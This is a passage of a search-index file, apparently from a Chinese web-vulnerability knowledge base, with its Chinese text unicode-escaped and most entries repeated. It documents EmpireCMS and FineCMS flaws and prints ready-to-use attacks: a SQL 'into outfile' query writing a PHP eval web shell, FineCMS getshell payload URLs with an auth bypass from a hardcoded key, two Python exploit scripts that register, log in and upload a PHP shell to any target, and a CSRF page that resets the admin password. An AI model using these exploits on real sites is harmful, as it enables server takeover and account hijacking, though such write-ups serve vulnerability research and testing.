\u7531\u4e8e\u540e\u7aef\u6ca1\u6709\u5bf9\u6267\u884c\u7684\u8bed\u53e5\u505a\u9650\u5236\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u6076\u610fsql\u8bed\u53e5\u3002 POC\uff1a select '<?php @eval($_POST[1])?>' into outfile 'D:/phpstudy_pro/WWW/shell.php' \u6839\u636e\u5b9e\u9645\u8def\u5f84\u4fee\u6539\u8def\u5f84\u5373\u53ef\u3002","title":"EmpireCMS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/#_1","text":"EmpireCMS <= V7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/#_2","text":"\u7531\u4e8e\u540e\u7aef\u6ca1\u6709\u5bf9\u6267\u884c\u7684\u8bed\u53e5\u505a\u9650\u5236\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u6076\u610fsql\u8bed\u53e5\u3002 POC\uff1a select '<?php @eval($_POST[1])?>' into outfile 'D:/phpstudy_pro/WWW/shell.php' \u6839\u636e\u5b9e\u9645\u8def\u5f84\u4fee\u6539\u8def\u5f84\u5373\u53ef\u3002","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u6d4b\u8bd5\u73af\u5883 \u00b6 Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26 \u6f0f\u6d1e\u73af\u5883\u642d\u5efa \u00b6 1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09 \u00b6 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.phome.net/download/ 2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55 \u00b6 3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c \u00b6 \u5730\u5740\uff1a http://127.0.0.1/e/install/index.php 4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef \u00b6","title":"EmpireCMS\u5404\u7248\u672c\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"Windows10 \u5bb6\u5ead\u7248 phpstudy\u96c6\u6210Apache2.4.39 PHP5.6.9 MySql5.7.26","title":"\u6d4b\u8bd5\u73af\u5883"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#1empirecms","text":"\u4e0b\u8f7d\u5730\u5740\uff1a http://www.phome.net/download/","title":"1.\u4e0b\u8f7dEmpireCMS\u5b89\u88c5\u5305\uff08\u6309\u7167\u6240\u9700\u7248\u672c\u4e0b\u8f7d\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#2-upload","text":"","title":"2.\u5c06 \u5b89\u88c5\u5305upload\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u653e\u5165\u7f51\u7ad9\u6839\u76ee\u5f55"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#3","text":"\u5730\u5740\uff1a http://127.0.0.1/e/install/index.php","title":"3.\u6d4f\u89c8\u5668\u8bbf\u95ee\u5b89\u88c5\u811a\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#4","text":"","title":"4.\u63a5\u4e0b\u6765\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u5b89\u88c5\u5373\u53ef"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/","text":"0x01 \u524d\u8a00 \u00b6 \u5c31\u8981\u88ab**\uff0c\u7f8e\u5176\u540d\u66f0\uff1a\u6bd4\u6211\u7684web\u5b89\u5168\u7814\u7a76\u548c\u4ee3\u7801\u5ba1\u8ba1\u66f4\u6709\u524d\u9014\u3002\u5f53\u7136\u662f\u9009\u62e9\u539f\u8c05\u4ed6\u5566\u3002 \u5148\u5ba1\u8ba1finecms\u53bb\u53bb\u706b\uff0c\u627e\u5230\u516d\u5904\u6f0f\u6d1e\uff0c\u5148\u653e\u4e24\u5904\u5bb9\u6613\u88ab\u53d1\u73b0\u7684getshell\u548c\u5bf9\u5e94\u7684\u4e24\u4e2apython\u811a\u672c 0x02 getshell \u00b6 \u7b2c\u4e00\u5904getshell \uff1a\u5728C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php\u4e2d\u7684data2\u51fd\u6570\uff0c\u5927\u7ea6\u5728\u7b2c115\u884c\uff0c\u6709\u95ee\u9898\u7684\u4ee3\u7801\u5927\u7ea6\u5728178\u884c public function data2() { $data = array(); // \u5b89\u5168\u7801\u8ba4\u8bc1 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // \u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e $data = array('msg' => '\u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e', 'code' => 0); } else { // \u89e3\u6790\u6570\u636e $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { if ($param == 'login') { // \u767b\u5f55\u8ba4\u8bc1 $code = $this->member_model->login( $this->input->get('username'), $this->input->get('password'), 0, 1); if (is_array($code)) { $data = array( 'msg' => 'ok', 'code' => 1, 'return' => $this->member_model->get_member($code['uid']) ); } elseif ($code == -1) { $data = array('msg' => fc_lang('\u4f1a\u5458\u4e0d\u5b58\u5728'), 'code' => 0); } elseif ($code == -2) { $data = array('msg' => fc_lang('\u5bc6\u7801\u4e0d\u6b63\u786e'), 'code' => 0); } elseif ($code == -3) { $data = array('msg' => fc_lang('Ucenter\u6ce8\u518c\u5931\u8d25'), 'code' => 0); } elseif ($code == -4) { $data = array('msg' => fc_lang('Ucenter\uff1a\u4f1a\u5458\u540d\u79f0\u4e0d\u5408\u6cd5'), 'code' => 0); } } elseif ($param == 'update_avatar') { // \u66f4\u65b0\u5934\u50cf $uid = (int)$_REQUEST['uid']; $file = $_REQUEST['file']; // // \u521b\u5efa\u56fe\u7247\u5b58\u50a8\u6587\u4ef6\u5939 $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/'; @dr_dir_delete($dir); if (!is_dir($dir)) { dr_mkdirs($dir); } $file = str_replace(' ', '+', $file); if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1', 'code' => 0 ); } \u5176\u4e2d\uff0c\u9996\u5148 $file = $_REQUEST['file']; \u83b7\u53d6$file\u53d8\u91cf if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1', 'code' => 0 ); \u7136\u540e\u7528preg_match\u51fd\u6570\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u56e0\u4e3a \\(file\u53d8\u91cf\u53ef\u63a7\uff0c\u6240\u4ee5\\) result\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u4ece\u800c$new_file\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u53ef\u4ee5\u6784\u9020\u4e3aphp\u6587\u4ef6\uff0c\u7136\u540e file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) \u5bf9 \\(result[1]\u8fdb\u884cbase64\u89e3\u7801\uff0c\u7136\u540e\u5199\u5165\\) new_file\u6587\u4ef6\u4e2d\u3002\u663e\u7136\uff0c\u662f\u53ef\u4ee5\u4efb\u610f\u5199\u6587\u4ef6\u8fdb\u884cgetshell\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u8ba9\u7a0b\u5e8f\u80fd\u591f\u8fd0\u884c\u5230\u8fd9\u4e9b\u4ee3\u7801\uff0c\u4e0d\u80fd\u5728\u4e4b\u524d\u5c31\u9000\u51fa\u4e86\u3002\u8981\u7ecf\u8fc7 $auth = $this->input->get('auth'); if ($auth != md5(SYS_KEY)) SYS_KEY\u88ab\u7cfb\u7edf\u786c\u7f16\u7801\u4e3a24b16fede9a67c9251d3e7c7161c83ac\uff0c\u5728C:phpStudyWWWconfigsystem.php\u4e2d\u6709\u5b9a\u4e49\u3002\u76f4\u63a5md5\u52a0\u5bc6\u4e00\u6b21\u5373\u53ef\u7ed5\u8fc7 \u6240\u4ee5\u6700\u7ec8\u7684payload\u4e3a http://localhost:88/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ \u65e0\u9700\u767b\u5f55\uff0c\u76f4\u63a5getshell,\u8def\u5f84\u4e3ahttp://localhost:88/uploadfile/member/0/0x0.php \u7b2c\u4e8c\u5904getshell \uff1a\u5728\u6587\u4ef6C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php\u4e2d\u7684upload\u51fd\u6570 if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { exit(dr_json(0, '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1')); \u6ce8\u518c\u4f1a\u5458\uff0c\u767b\u5f55 \u8bbf\u95ee\uff1ahttp://localhost:88/index.php?s=member&c=account&m=upload POST\uff1atx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ 0x03 Python\u6279\u91cfpoc\u811a\u672c \u00b6 pocsuite\u548cpoc-T\u662f\u4e24\u4e2a\u6210\u719f\u7684poc\u6846\u67b6\uff0c\u4e0d\u8fc7\u611f\u89c9\u6838\u5fc3\u4ee3\u7801\u662f\u522b\u4eba\u7684\uff0c\u53ea\u5199\u4e00\u4e9bpoc\u63d2\u4ef6\u7684\u8bdd\uff0c\u5c31\u662f\u4e3a\u522b\u4eba\u9020\u8f6e\u5b50\uff0c\u6240\u4ee5\u62bd\u4e86\u4e00\u4e9b\u4ee3\u7801\u5199\u4e86\u4e2a\u81ea\u5df1\u7684\u5de5\u5177\uff0c\u53ef\u80fd\u8fde\u8f7b\u578b\u6846\u67b6\u90fd\u7b97\u4e0d\u4e0a\uff0c\u53ea\u591f\u81ea\u5df1\u7528\u7684\u3002 \u7b2c\u4e00\u5904getshell\u7684python\u4ee3\u7801\uff08\u56e0\u4e3a\u662f\u76f4\u63a5getshell\uff0c\u65e0\u9700\u767b\u5f55\uff0c\u6240\u4ee5\u5f88\u7b80\u5355\uff09\uff1a import sys import requests def poc ( target ): payload = \"/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+\" url = target + payload shell = target + '/uploadfile/member/0/0x0.php' try : result = requests . get ( url , timeout = 3 ) verify = requests . get ( shell , timeout = 3 ) if verify . status_code == 200 and 'code' in verify . text : return True except Exception , e : print e \u7b2c\u4e8c\u5904getshell\u7684Python\u4ee3\u7801\uff08\u9700\u8981\u81ea\u52a8\u5316\u6ce8\u518c\u3001\u767b\u5f55\u3001\u5229\u7528\uff09\uff1a #Finecms version:5.0.8 #Author:404notfound import random import sys import requests def poc ( url ): username = random . randint ( 0 , 999999 ) seed = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" email = [] for i in range ( 8 ): email . append ( random . choice ( seed )) email = '' . join ( email ) #print email+\"@\"+email+\".com\" #print username #step 1 register #print \"[+] register user\" register_url = url + \"/index.php?s=member&c=register&m=index\" register_payload = { \"back\" : \"\" , \"data[username]\" : username , \"data[password]\" : \"123456\" , \"data[password2]\" : \"123456\" , \"data[email]\" : email + \"@\" + email + \".com\" } #step 2 login #print \"[+] user login\" login_url = url + \"/index.php?s=member&c=login&m=index\" login_payload = { \"back\" : \"\" , \"data[username]\" : username , \"data[password]\" : \"123456\" , \"data[auto]\" : \"1\" } #step 3 attack #print \"[+] loading payload\" vul_url = url + \"/index.php?s=member&c=account&m=upload\" vul_payload = { \"tx\" : \"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4=\" } try : s = requests . session () resu = s . post ( register_url , data = register_payload ) result = s . post ( login_url , data = login_payload ) result2 = s . post ( vul_url , data = vul_payload ) . content if \"status\" in result2 : return True else : return False except Exception , e : pass #print e #print \"[+] ALL DONE\" #step 4 find shell path #print poc(\"http://localhost\") get\u811a\u672cgithub\u8bbf\u95ee\u83b7\u53d6","title":"FineCMS v5.0.8\u4e24\u5904getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x01","text":"\u5c31\u8981\u88ab**\uff0c\u7f8e\u5176\u540d\u66f0\uff1a\u6bd4\u6211\u7684web\u5b89\u5168\u7814\u7a76\u548c\u4ee3\u7801\u5ba1\u8ba1\u66f4\u6709\u524d\u9014\u3002\u5f53\u7136\u662f\u9009\u62e9\u539f\u8c05\u4ed6\u5566\u3002 \u5148\u5ba1\u8ba1finecms\u53bb\u53bb\u706b\uff0c\u627e\u5230\u516d\u5904\u6f0f\u6d1e\uff0c\u5148\u653e\u4e24\u5904\u5bb9\u6613\u88ab\u53d1\u73b0\u7684getshell\u548c\u5bf9\u5e94\u7684\u4e24\u4e2apython\u811a\u672c","title":"0x01 \u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x02-getshell","text":"\u7b2c\u4e00\u5904getshell \uff1a\u5728C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php\u4e2d\u7684data2\u51fd\u6570\uff0c\u5927\u7ea6\u5728\u7b2c115\u884c\uff0c\u6709\u95ee\u9898\u7684\u4ee3\u7801\u5927\u7ea6\u5728178\u884c public function data2() { $data = array(); // \u5b89\u5168\u7801\u8ba4\u8bc1 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // \u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e $data = array('msg' => '\u6388\u6743\u8ba4\u8bc1\u7801\u4e0d\u6b63\u786e', 'code' => 0); } else { // \u89e3\u6790\u6570\u636e $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { if ($param == 'login') { // \u767b\u5f55\u8ba4\u8bc1 $code = $this->member_model->login( $this->input->get('username'), $this->input->get('password'), 0, 1); if (is_array($code)) { $data = array( 'msg' => 'ok', 'code' => 1, 'return' => $this->member_model->get_member($code['uid']) ); } elseif ($code == -1) { $data = array('msg' => fc_lang('\u4f1a\u5458\u4e0d\u5b58\u5728'), 'code' => 0); } elseif ($code == -2) { $data = array('msg' => fc_lang('\u5bc6\u7801\u4e0d\u6b63\u786e'), 'code' => 0); } elseif ($code == -3) { $data = array('msg' => fc_lang('Ucenter\u6ce8\u518c\u5931\u8d25'), 'code' => 0); } elseif ($code == -4) { $data = array('msg' => fc_lang('Ucenter\uff1a\u4f1a\u5458\u540d\u79f0\u4e0d\u5408\u6cd5'), 'code' => 0); } } elseif ($param == 'update_avatar') { // \u66f4\u65b0\u5934\u50cf $uid = (int)$_REQUEST['uid']; $file = $_REQUEST['file']; // // \u521b\u5efa\u56fe\u7247\u5b58\u50a8\u6587\u4ef6\u5939 $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/'; @dr_dir_delete($dir); if (!is_dir($dir)) { dr_mkdirs($dir); } $file = str_replace(' ', '+', $file); if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1', 'code' => 0 ); } \u5176\u4e2d\uff0c\u9996\u5148 $file = $_REQUEST['file']; \u83b7\u53d6$file\u53d8\u91cf if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1', 'code' => 0 ); \u7136\u540e\u7528preg_match\u51fd\u6570\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u56e0\u4e3a \\(file\u53d8\u91cf\u53ef\u63a7\uff0c\u6240\u4ee5\\) result\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u4ece\u800c$new_file\u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u53ef\u4ee5\u6784\u9020\u4e3aphp\u6587\u4ef6\uff0c\u7136\u540e file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) \u5bf9 \\(result[1]\u8fdb\u884cbase64\u89e3\u7801\uff0c\u7136\u540e\u5199\u5165\\) new_file\u6587\u4ef6\u4e2d\u3002\u663e\u7136\uff0c\u662f\u53ef\u4ee5\u4efb\u610f\u5199\u6587\u4ef6\u8fdb\u884cgetshell\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u8ba9\u7a0b\u5e8f\u80fd\u591f\u8fd0\u884c\u5230\u8fd9\u4e9b\u4ee3\u7801\uff0c\u4e0d\u80fd\u5728\u4e4b\u524d\u5c31\u9000\u51fa\u4e86\u3002\u8981\u7ecf\u8fc7 $auth = $this->input->get('auth'); if ($auth != md5(SYS_KEY)) SYS_KEY\u88ab\u7cfb\u7edf\u786c\u7f16\u7801\u4e3a24b16fede9a67c9251d3e7c7161c83ac\uff0c\u5728C:phpStudyWWWconfigsystem.php\u4e2d\u6709\u5b9a\u4e49\u3002\u76f4\u63a5md5\u52a0\u5bc6\u4e00\u6b21\u5373\u53ef\u7ed5\u8fc7 \u6240\u4ee5\u6700\u7ec8\u7684payload\u4e3a http://localhost:88/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ \u65e0\u9700\u767b\u5f55\uff0c\u76f4\u63a5getshell,\u8def\u5f84\u4e3ahttp://localhost:88/uploadfile/member/0/0x0.php \u7b2c\u4e8c\u5904getshell \uff1a\u5728\u6587\u4ef6C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php\u4e2d\u7684upload\u51fd\u6570 if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { exit(dr_json(0, '\u76ee\u5f55\u6743\u9650\u4e0d\u8db3\u6216\u78c1\u76d8\u5df2\u6ee1')); \u6ce8\u518c\u4f1a\u5458\uff0c\u767b\u5f55 \u8bbf\u95ee\uff1ahttp://localhost:88/index.php?s=member&c=account&m=upload POST\uff1atx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+","title":"0x02 getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/#0x03-pythonpoc","text":"pocsuite\u548cpoc-T\u662f\u4e24\u4e2a\u6210\u719f\u7684poc\u6846\u67b6\uff0c\u4e0d\u8fc7\u611f\u89c9\u6838\u5fc3\u4ee3\u7801\u662f\u522b\u4eba\u7684\uff0c\u53ea\u5199\u4e00\u4e9bpoc\u63d2\u4ef6\u7684\u8bdd\uff0c\u5c31\u662f\u4e3a\u522b\u4eba\u9020\u8f6e\u5b50\uff0c\u6240\u4ee5\u62bd\u4e86\u4e00\u4e9b\u4ee3\u7801\u5199\u4e86\u4e2a\u81ea\u5df1\u7684\u5de5\u5177\uff0c\u53ef\u80fd\u8fde\u8f7b\u578b\u6846\u67b6\u90fd\u7b97\u4e0d\u4e0a\uff0c\u53ea\u591f\u81ea\u5df1\u7528\u7684\u3002 \u7b2c\u4e00\u5904getshell\u7684python\u4ee3\u7801\uff08\u56e0\u4e3a\u662f\u76f4\u63a5getshell\uff0c\u65e0\u9700\u767b\u5f55\uff0c\u6240\u4ee5\u5f88\u7b80\u5355\uff09\uff1a import sys import requests def poc ( target ): payload = \"/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+\" url = target + payload shell = target + '/uploadfile/member/0/0x0.php' try : result = requests . get ( url , timeout = 3 ) verify = requests . get ( shell , timeout = 3 ) if verify . status_code == 200 and 'code' in verify . text : return True except Exception , e : print e \u7b2c\u4e8c\u5904getshell\u7684Python\u4ee3\u7801\uff08\u9700\u8981\u81ea\u52a8\u5316\u6ce8\u518c\u3001\u767b\u5f55\u3001\u5229\u7528\uff09\uff1a #Finecms version:5.0.8 #Author:404notfound import random import sys import requests def poc ( url ): username = random . randint ( 0 , 999999 ) seed = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" email = [] for i in range ( 8 ): email . append ( random . choice ( seed )) email = '' . join ( email ) #print email+\"@\"+email+\".com\" #print username #step 1 register #print \"[+] register user\" register_url = url + \"/index.php?s=member&c=register&m=index\" register_payload = { \"back\" : \"\" , \"data[username]\" : username , \"data[password]\" : \"123456\" , \"data[password2]\" : \"123456\" , \"data[email]\" : email + \"@\" + email + \".com\" } #step 2 login #print \"[+] user login\" login_url = url + \"/index.php?s=member&c=login&m=index\" login_payload = { \"back\" : \"\" , \"data[username]\" : username , \"data[password]\" : \"123456\" , \"data[auto]\" : \"1\" } #step 3 attack #print \"[+] loading payload\" vul_url = url + \"/index.php?s=member&c=account&m=upload\" vul_payload = { \"tx\" : \"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4=\" } try : s = requests . session () resu = s . post ( register_url , data = register_payload ) result = s . post ( login_url , data = login_payload ) result2 = s . post ( vul_url , data = vul_payload ) . content if \"status\" in result2 : return True else : return False except Exception , e : pass #print e #print \"[+] ALL DONE\" #step 4 find shell path #print poc(\"http://localhost\") get\u811a\u672cgithub\u8bbf\u95ee\u83b7\u53d6","title":"0x03 Python\u6279\u91cfpoc\u811a\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Finecms_v5.4\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u4fee\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801 2018-10-07 \u8e0f\u6708\u7559\u9999 http://www.finecms.net/ http://down.chinaz.com/soft/32596.htm 5.4 CVE-2018-18191 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2ahtml\u9875\u9762\u8bf1\u9a97\u5df2\u767b\u5f55\u7684\u7ba1\u7406\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://127.0.0.1/admin.php?c=member&m=edit&uid=1\" method = \"POST\" > < input type = \"hidden\" name = \"page\" value = \"0\" /> < input type = \"hidden\" name = \"member&#91;email&#93;\" value = \"admin&#64;163&#46;com\" /> < input type = \"hidden\" name = \"member&#91;name&#93;\" value = \"admin\" /> < input type = \"hidden\" name = \"member&#91;phone&#93;\" value = \"18888888888\" /> < input type = \"hidden\" name = \"member&#91;password&#93;\" value = \"888888\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"Finecms v5.4\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u4fee\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Finecms_v5.4\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u4fee\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801 2018-10-07 \u8e0f\u6708\u7559\u9999 http://www.finecms.net/ http://down.chinaz.com/soft/32596.htm 5.4 CVE-2018-18191","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#_2","text":"\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2ahtml\u9875\u9762\u8bf1\u9a97\u5df2\u767b\u5f55\u7684\u7ba1\u7406\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#poc","text":"exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://127.0.0.1/admin.php?c=member&m=edit&uid=1\" method = \"POST\" > < input type = \"hidden\" name = \"page\" value = \"0\" /> < input type = \"hidden\" name = \"member&#91;email&#93;\" value = \"admin&#64;163&#46;com\" /> < input type = \"hidden\" name = \"member&#91;name&#93;\" value = \"admin\" /> < input type = \"hidden\" name = \"member&#91;phone&#93;\" value = \"18888888888\" /> < input type = \"hidden\" name = \"member&#91;password&#93;\" value = \"888888\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html 